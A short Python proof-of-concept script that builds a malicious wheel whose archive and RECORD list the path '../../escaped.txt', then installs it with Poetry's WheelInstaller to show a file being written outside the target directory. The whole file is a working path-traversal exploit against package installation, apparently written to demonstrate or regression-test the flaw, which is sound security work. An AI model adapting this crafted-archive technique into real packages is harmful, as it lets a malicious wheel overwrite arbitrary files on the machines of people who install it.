import tempfile, zipfile
from pathlib import Path
from poetry.installation.wheel_installer import WheelInstaller

tmp = Path(tempfile.mkdtemp())
venv = tmp / "venv"
class Env:
    scheme_dict = {k: str(venv / k) for k in ("purelib", "platlib", "scripts", "data", "include")}
    python = Path("/usr/bin/python3")

di = "demo-1.0.dist-info"
whl = tmp / "demo-1.0-py3-none-any.whl"
with zipfile.ZipFile(whl, "w") as z:
    z.writestr("../../escaped.txt", "pwned")
    z.writestr(f"{di}/METADATA", "Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n")
    z.writestr(f"{di}/WHEEL", "Wheel-Version: 1.0\nGenerator: x\nRoot-Is-Purelib: true\nTag: py3-none-any\n")
    z.writestr(f"{di}/RECORD", f"../../escaped.txt,,\n{di}/METADATA,,\n{di}/WHEEL,,\n{di}/RECORD,,\n")

WheelInstaller(Env()).install(whl)
print((tmp / "escaped.txt").exists(), (tmp / "escaped.txt").read_text())
